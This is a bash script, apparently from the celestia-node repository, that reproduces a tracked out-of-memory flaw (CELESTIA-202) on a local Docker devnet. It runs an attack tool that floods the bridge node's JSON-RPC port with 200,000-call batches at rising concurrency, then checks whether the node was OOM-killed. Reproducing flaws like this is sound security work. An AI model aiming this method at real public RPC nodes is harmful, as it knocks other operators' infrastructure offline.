#!/usr/bin/env bash
#
# repro.sh — Reproduce CELESTIA-202 OOM vulnerability
#
# This script uses docker-compose to start a local devnet (celestia-app
# validator + celestia-node bridge) with a 512 MB memory limit on the bridge
# node, then sends a large JSON-RPC batch request to trigger an OOM crash.
#
# Usage:
#   bash api/rpc/oom-repro/repro.sh
#
# Prerequisites:
#   - Docker (with compose) must be running
#   - Go must be installed (to run the attack tool)
#   - Run from the repository root

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/../../.." && pwd)"
BRIDGE_CONTAINER="celestia-bridge"
VALIDATOR_CONTAINER="celestia-validator"
BATCH_SIZE="200000"
RPC_URL="http://localhost:26658"

# Containers are preserved after the script so you can inspect them.
# To clean up manually:
#   cd api/rpc/oom-repro && docker compose down -v

echo "=== CELESTIA-202: OOM Reproduction ==="
echo ""
echo "This script demonstrates that unlimited JSON-RPC batch requests"
echo "can crash a celestia-node via OOM."
echo ""

# Step 1: Build images and start the validator first.
echo "=== Step 1: Building images and starting validator ==="
cd "${SCRIPT_DIR}"
docker compose build 2>&1 | tail -5
docker compose up -d celestia-validator 2>&1 | tail -5
echo ""

# Step 2: Wait for the validator to start producing blocks.
echo "=== Step 2: Waiting for validator to produce blocks ==="
MAX_WAIT=60
WAITED=0

while [ ${WAITED} -lt ${MAX_WAIT} ]; do
    if ! docker ps --format '{{.Names}}' | grep -q "^${VALIDATOR_CONTAINER}$"; then
        echo "Validator container exited unexpectedly."
        echo "Validator logs (last 20 lines):"
        docker logs "${VALIDATOR_CONTAINER}" 2>&1 | tail -20
        exit 1
    fi

    if docker logs "${VALIDATOR_CONTAINER}" 2>&1 | grep -q "finalizing commit of block"; then
        echo "Validator producing blocks after ${WAITED}s"
        break
    fi

    sleep 1
    WAITED=$((WAITED + 1))
    if [ $((WAITED % 10)) -eq 0 ]; then
        echo "  Still waiting... (${WAITED}s)"
    fi
done

if [ ${WAITED} -ge ${MAX_WAIT} ]; then
    echo "Timed out waiting for validator (${MAX_WAIT}s)"
    echo "Validator logs (last 20 lines):"
    docker logs "${VALIDATOR_CONTAINER}" 2>&1 | tail -20
    exit 1
fi
echo ""

# Step 3: Start the bridge node now that the validator is ready.
echo "=== Step 3: Starting bridge node (memory limit: 512m) ==="
docker compose up -d celestia-bridge 2>&1 | tail -5
echo ""

# Step 4: Wait for bridge RPC to become ready.
echo "=== Step 4: Waiting for bridge node RPC server ==="
MAX_WAIT=120
WAITED=0

while [ ${WAITED} -lt ${MAX_WAIT} ]; do
    # Check if bridge container is still running.
    if ! docker ps --format '{{.Names}}' | grep -q "^${BRIDGE_CONTAINER}$"; then
        echo "Bridge container exited before RPC became ready."
        echo "Bridge container logs (last 30 lines):"
        docker logs "${BRIDGE_CONTAINER}" 2>&1 | tail -30
        exit 1
    fi

    # Try a simple RPC call.
    if curl -sf -X POST "${RPC_URL}" \
        -H "Content-Type: application/json" \
        -d '{"jsonrpc":"2.0","method":"node.Info","params":[],"id":1}' \
        >/dev/null 2>&1; then
        echo "RPC server ready after ${WAITED}s"
        break
    fi

    sleep 1
    WAITED=$((WAITED + 1))
    if [ $((WAITED % 10)) -eq 0 ]; then
        echo "  Still waiting... (${WAITED}s)"
    fi
done

if [ ${WAITED} -ge ${MAX_WAIT} ]; then
    echo "Timed out waiting for RPC server (${MAX_WAIT}s)"
    echo "Bridge container logs (last 30 lines):"
    docker logs "${BRIDGE_CONTAINER}" 2>&1 | tail -30
    exit 1
fi
echo ""

# Probe the response size for header.LocalHead so we can estimate memory impact.
echo "=== Probing response size ==="
PROBE_RESP=$(curl -s -X POST "${RPC_URL}" \
    -H "Content-Type: application/json" \
    -d '{"jsonrpc":"2.0","method":"header.LocalHead","params":[],"id":1}')
RESP_SIZE=${#PROBE_RESP}
echo "Single header.LocalHead response: ${RESP_SIZE} bytes"
ESTIMATED_MB=$(( (RESP_SIZE * BATCH_SIZE) / 1048576 ))
echo "Estimated per-batch response: ~${ESTIMATED_MB} MB (${BATCH_SIZE} requests)"
echo "Attack plan: ramp up concurrent connections (1..20) with 10s pauses"
echo "Container memory limit: 512 MB"
echo ""

# Step 5: Monitor memory and send attack waves.
echo "=== Step 5: Sending attack (ramping up concurrency) ==="
echo "Target: ${RPC_URL}"
echo "Monitor memory: run 'docker stats celestia-bridge' in another terminal"
echo ""

# Show baseline memory.
echo "Baseline memory:"
docker stats "${BRIDGE_CONTAINER}" --no-stream --format '  {{.MemUsage}} ({{.MemPerc}})'
echo ""

# Monitor memory in the background.
(while docker ps --format '{{.Names}}' | grep -q "^${BRIDGE_CONTAINER}$" 2>/dev/null; do
    docker stats "${BRIDGE_CONTAINER}" --no-stream --format '[memory] {{.MemUsage}} ({{.MemPerc}})' 2>/dev/null
    sleep 1
done) &
STATS_PID=$!

cd "${SCRIPT_DIR}"
go run attack.go \
    -target "${RPC_URL}" \
    -batch-size "${BATCH_SIZE}" \
    -method "header.LocalHead" \
    || true

kill "${STATS_PID}" 2>/dev/null || true
wait "${STATS_PID}" 2>/dev/null || true
echo ""

# Give the container a moment to be killed by the OOM killer.
sleep 3

# Step 6: Check OOM status.
echo "=== Step 6: Checking OOM status ==="

RUNNING=$(docker inspect --format '{{.State.Running}}' "${BRIDGE_CONTAINER}" 2>/dev/null || echo "unknown")
OOM_KILLED=$(docker inspect --format '{{.State.OOMKilled}}' "${BRIDGE_CONTAINER}" 2>/dev/null || echo "unknown")
EXIT_CODE=$(docker inspect --format '{{.State.ExitCode}}' "${BRIDGE_CONTAINER}" 2>/dev/null || echo "unknown")

echo "Container running: ${RUNNING}"
echo "OOM killed:        ${OOM_KILLED}"
echo "Exit code:         ${EXIT_CODE}"
echo ""

# Exit code 137 = killed by signal 9 (SIGKILL), which is what the OOM killer sends.
if [ "${OOM_KILLED}" = "true" ]; then
    echo "=== RESULT: VULNERABILITY CONFIRMED ==="
    echo ""
    echo "The bridge node was OOM-killed after receiving the batch request."
    echo "This confirms CELESTIA-202: unlimited JSON-RPC batch requests can"
    echo "crash celestia-node by exhausting memory."
    exit 0
elif [ "${EXIT_CODE}" = "137" ]; then
    echo "=== RESULT: VULNERABILITY LIKELY CONFIRMED ==="
    echo ""
    echo "The bridge node was killed with exit code 137 (SIGKILL)."
    echo "This is consistent with an OOM kill, though the OOMKilled flag"
    echo "was not set (this can happen with some Docker/cgroup configurations)."
    exit 0
elif [ "${RUNNING}" = "false" ]; then
    echo "=== RESULT: CONTAINER CRASHED ==="
    echo ""
    echo "The bridge node exited (code ${EXIT_CODE}) after the batch request."
    echo "Bridge container logs (last 10 lines):"
    docker logs "${BRIDGE_CONTAINER}" 2>&1 | tail -10
    exit 0
else
    echo "=== RESULT: CONTAINER STILL RUNNING ==="
    echo ""
    echo "The bridge node survived the batch request. The batch size (${BATCH_SIZE})"
    echo "may not be large enough for the 512m memory limit, or a"
    echo "mitigation is in place."
    echo ""
    echo "Try increasing the batch size or decreasing the memory limit."
    exit 1
fi
